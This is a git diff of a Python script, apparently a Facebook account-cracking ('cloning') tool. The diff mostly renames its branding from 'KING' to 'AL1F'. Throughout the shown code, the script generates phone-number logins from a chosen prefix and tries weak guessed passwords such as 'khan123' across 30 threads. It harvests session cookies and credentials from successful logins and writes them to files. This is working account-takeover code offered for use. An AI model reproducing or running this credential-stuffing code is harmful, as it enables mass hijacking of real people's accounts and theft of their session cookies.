+  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');linex()
   hc = input(f'{wt}Select Method {M}:{H} ')
   for nmbr in range(limit):
     nmp = ''.join(random.choice(string.digits) for _ in range(6))
     user.append(nmp)
-  with tred(max_workers=30) as king_xd:
+  with tred(max_workers=30) as AL1F_xd:
     os.system('clear')
     tl = str(len(user))
-    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');print(led)
+    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');linex()
     for guru in user: 
       idf = kode+guru
       pwv=[idf,guru,idf[:7],idf[:6],idf[:8]]
-      if hc in ['1','01']:king_xd.submit(m33,idf,pwv)
-      elif hc in ['2','02']:king_xd.submit(m2,idf,pwv)
-      elif hc in ['3','03']:king_xd.submit(m3,idf,pwv)
-      elif hc in ['4','04']:king_xd.submit(m4,idf,pwv)
-      elif hc in ['5','05']:king_xd.submit(f1,idf,pwv)
-      elif hc in ['6','06']:king_xd.submit(f1,idf,pwv)
+      if hc in ['1','01']:AL1F_xd.submit(m33,idf,pwv)
+      elif hc in ['2','02']:AL1F_xd.submit(m2,idf,pwv)
+      elif hc in ['3','03']:AL1F_xd.submit(m3,idf,pwv)
+      elif hc in ['4','04']:AL1F_xd.submit(m4,idf,pwv)
+      elif hc in ['5','05']:AL1F_xd.submit(f1,idf,pwv)
+      elif hc in ['6','06']:AL1F_xd.submit(f1,idf,pwv)
       else:
-       king_xd.submit(m5,idf,pwv)
+       AL1F_xd.submit(m5,idf,pwv)
   print('');print(f'{N} Hi Dear User Crack process has been completed')
   input(f'{dot}Press Enter To Go Menu');os.system('python CYB3R-A1IF.py')
 # INDIA X PAKISTAN -- MAIN DEF #
 def xp():
   user=[]
-  os.system('clear');banner();print(c7);print(led)
-  kode = input(f'{dot}Select Code {M}: {H}');print(led);print(limitt);print(led)
-  limit = int(input(f'{dot}Crack Limit {M}: {H}'));print(led)
+  os.system('clear');banner();print(c7);linex()
+  kode = input(f'{dot}Select Code {M}: {H}');linex();print(limitt);linex()
+  limit = int(input(f'{dot}Crack Limit {M}: {H}'));linex()
   xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
   if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
   else:cp_xdx.append('n')
-  print(led)
+  linex()
   cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
   if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
   else:cokix.append('n')
-  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
-  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
+  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);linex();print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
+  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');linex()
   hc = input(f'{wt}Select Method {M}:{H} ')
   if hc in ['1','01']:mtd.append('m1')
   elif hc in ['2','02']:mtd.append('m2')
@@ -783,22 +784,22 @@ def xp():
   for nmbr in range(limit):
     nmp = ''.join(random.choice(string.digits) for _ in range(7))
     user.append(nmp)
-  with tred(max_workers=30) as king_xd:
+  with tred(max_workers=30) as AL1F_xd:
     os.system('clear')
     tl = str(len(user))
-    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');print(led)
+    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');linex()
     for guru in user:
       idf = kode+guru
       pwv = [guru,'khankhan','khan khan','khan123','khan12','khan1122']
      # pwv = [idf,guru,idf[:6],idf[:7],guru[1:]] #,'@#@#@#','bangladesh'] #,'@#@#@#','bangladesh','free fire','i love you']
-      if 'm1' in mtd:king_xd.submit(f1,idf,pwv)
-      elif 'm2' in mtd:king_xd.submit(m2,idf,pwv)
-      elif 'm3' in mtd:king_xd.submit(m3,idf,pwv)
-      elif 'm4' in mtd:king_xd.submit(m4,idf,pwv)
-      elif 'a1' in mtd:king_xd.submit(f1,idf,pwv)
-      elif 'f1' in mtd:king_xd.submit(f1,idf,pwv)
+      if 'm1' in mtd:AL1F_xd.submit(f1,idf,pwv)
+      elif 'm2' in mtd:AL1F_xd.submit(m2,idf,pwv)
+      elif 'm3' in mtd:AL1F_xd.submit(m3,idf,pwv)
+      elif 'm4' in mtd:AL1F_xd.submit(m4,idf,pwv)
+      elif 'a1' in mtd:AL1F_xd.submit(f1,idf,pwv)
+      elif 'f1' in mtd:AL1F_xd.submit(f1,idf,pwv)
       else:
-       king_xd.submit(m5,idf,pwv)
+       AL1F_xd.submit(m5,idf,pwv)
   print('');print(f'{N} Hi Dear User Crack process has been completed')
   input(f'{dot}Press Enter To Go Menu');os.system('python CYB3R-A1IF.py')
 
@@ -811,7 +812,7 @@ useragent = ('Mozilla/5.0 (Linux; Android {};{} Build/{}; wv) AppleWebKit/537.36
 
 def m1(idf,pwv):
     global loop, ok, cp
-    animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
+    animasi = random.choice(["\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F","\x1b[1;97mAL1F","\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F"])
     sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
     sys.stdout.flush()
     az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
@@ -851,7 +852,7 @@ def m1(idf,pwv):
              idf = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
              cp+=1
              if 'y' in cp_xdx:
-              print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
+              print(f'\r{P} [\033[1;30mAL1F-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
              open(' /sdcard/CYB3R-A1IF-CP.txt', 'a').write(idf+'|'+pw)
              cp.append(idf)
              break
@@ -859,7 +860,7 @@ def m1(idf,pwv):
                 kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                 idf = re.findall('c_user=(.*);xs', kukis)[0]
                 ok+=1
-                print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
+                print(f'\r{P} [{H}AL1F-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                 if 'y' in cokix:
                  print(f'\r{gen}{H}'+kukis)
                 open(' /sdcard/CYB3R-A1IF-OK.txt', 'a').write(idf+'|'+pw)
@@ -874,7 +875,7 @@ def m1(idf,pwv):
 
 def m2(idf,pwv):
  global loop,ok,cp
- animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
+ animasi = random.choice(["\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F","\x1b[1;97mAL1F","\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F"])
  sys.stdout.write(f'\r{P} [{animasi}-{H}M2{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
  sys.stdout.flush()
  ses = requests.Session()
@@ -892,7 +893,7 @@ def m2(idf,pwv):
    if "checkpoint" in po.cookies.get_dict().keys():
     idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
     if 'y' in cp_xdx:
-     print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
+     print(f'\r{P} [\033[1;30mAL1F-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
     open(' /sdcard/CYB3R-A1IF-CP.txt','a').write(idf+'|'+pw+'\n')
     ok.append(idf+'|'+pw)
     cp+=1
@@ -902,7 +903,7 @@ def m2(idf,pwv):
     kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
     idf = re.findall('c_user=(.*);xs', kuki)[0]
     ok+=1
-    print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
+    print(f'\r{P} [{H}AL1F-OK{P}] {GREEN}{idf}|{pw}{xxx}')
     if 'y' in cokix:
      print(f'\r{gen}{H}'+kuki)
     open(' /sdcard/CYB3R-A1IF-OK.txt','a').write(idf+'|'+pw+'\n')
@@ -919,7 +920,7 @@ def m2(idf,pwv):
 def m4(idx,pwv):
   global loop,ok,cp
  # gif = random.choice(["\x1b[1;91m•    ","\x1b[1;92m••   ","\x1b[1;93m•••  ","\x1b[1;94m•••• ","\x1b[1;95m•••••"])
-  animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
+  animasi = random.choice(["\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F","\x1b[1;97mAL1F","\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F"])
   sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M4{P}] ({B}%s{P}){U}{gif}{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
   sys.stdout.flush()
   ua = random.choice(useragent)
@@ -959,7 +960,7 @@ def m4(idx,pwv):
       if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
         if 'y' in cp_xdx:
-         print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
+         print(f'\r{P} [\033[1;30mAL1F-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
         open(' /sdcard/CYB3R-A1IF-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
         cp+=1
         break
@@ -968,7 +969,7 @@ def m4(idx,pwv):
         coki=po.cookies.get_dict()
         kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
         idf = re.findall('c_user=(.*);xs', kuki)[0]
-        print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
+        print(f'\r{P} [{H}AL1F-OK{P}] {GREEN}{idf}|{pw}{xxx}')
         if 'y' in cokix:
          print(f'\r{gen}{H}'+kuki)
         open(' /sdcard/CYB3R-A1IF-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
@@ -983,7 +984,7 @@ def m4(idx,pwv):
 ###----------[  FREE ]----------###
 def f1(idf,pwv):
   global loop,ok,cp
-  animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
+  animasi = random.choice(["\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F","\x1b[1;97mAL1F","\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F"])
   sys.stdout.write(f'\r{P} [{animasi}-{H}F1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
   sys.stdout.flush()
   ua = random.choice(usragent)
@@ -1023,7 +1024,7 @@ def f1(idf,pwv):
       if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
         if 'y' in cp_xdx:
-         print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
+         print(f'\r{P} [\033[1;30mAL1F-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
         open(' /sdcard/CYB3R-A1IF-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
         cp+=1
         break
@@ -1032,7 +1033,7 @@ def f1(idf,pwv):
         coki=po.cookies.get_dict()
         kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
         idf = re.findall('c_user=(.*);xs', kuki)[0]
-        print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
+        print(f'\r{P} [{H}AL1F-OK{P}] {GREEN}{idf}|{pw}{xxx}')
         if 'y' in cokix:
          print(f'\r{gen}{H}'+kuki)
         open(' /sdcard/CYB3R-A1IF-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
@@ -1059,7 +1060,7 @@ def m3(idf,pw):
  global loop
  global ok
  global agents
- animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
+ animasi = random.choice(["\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F","\x1b[1;97mAL1F","\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F"])
  sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M3{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
  try:
   for ps in pw:
@@ -1102,7 +1103,7 @@ def m3(idf,pw):
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    print('\r\033[1;32m [KING-OK] '+user+'|'+ps) #+'--'+coki)
+    print('\r\033[1;32m [AL1F-OK] '+user+'|'+ps) #+'--'+coki)
     if 'y' in cokix:
      print(f'\r{gen}{H}'+coki)
     ok+=1 
@@ -1114,7 +1115,7 @@ def m3(idf,pw):
     coki1 = coki.split("1000")[1]
     uid = "1000"+coki1[0:11]
     if 'y' in cp_xdx:
-     print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
+     print(f'\r{P} [\033[1;30mAL1F-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
     open(' /sdcard/CYB3R-A1IF-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
     cp.append(idf)
    else:
@@ -1127,12 +1128,12 @@ def m5(idf,pw):
  global loop
  global ok
  global agents
- animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
+ animasi = random.choice(["\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F","\x1b[1;97mAL1F","\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F"])
  sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M5{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
  try:
   for ps in pw:
    session = requests.Session()
-            #animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
+            #animasi = random.choice(["\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F","\x1b[1;97mAL1F","\x1b[1;91mAL1F","\x1b[1;92mAL1F","\x1b[1;93mAL1F","\x1b[1;94mAL1F","\x1b[1;95mAL1F","\x1b[1;96mAL1F"])
             #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
             #sys.stdout.flush()
    pro = random.choice(ugen)
@@ -1173,7 +1174,7 @@ def m5(idf,pw):
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    print('\r\033[1;32m [KING-OK] '+user+'|'+ps) #+'--'+coki)
+    print('\r\033[1;32m [AL1F-OK] '+user+'|'+ps) #+'--'+coki)
     if 'y' in cokix:
      print(f'\r{gen}{H}'+coki)
     ok+=1 
@@ -1185,7 +1186,7 @@ def m5(idf,pw):
     coki1 = coki.split("1000")[1]
     uid = "1000"+coki1[0:11]
     if 'y' in cp_xdx:
-     print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
+     print(f'\r{P} [\033[1;30mAL1F-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
     open(' /sdcard/CYB3R-A1IF-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
     cp.append(idf)
    else:
@@ -1197,7 +1198,7 @@ def m5(idf,pw):
 # INDIA X PAKISTAN -- MAIN DEF #
 
 if __name__=='__main__':
-  try:os.mkdir('KING-Alif')
+  try:os.mkdir('AL1F-Alif')
   except:pass
   try:os.mkdir('QUEEN-TISHA')
   except:pass
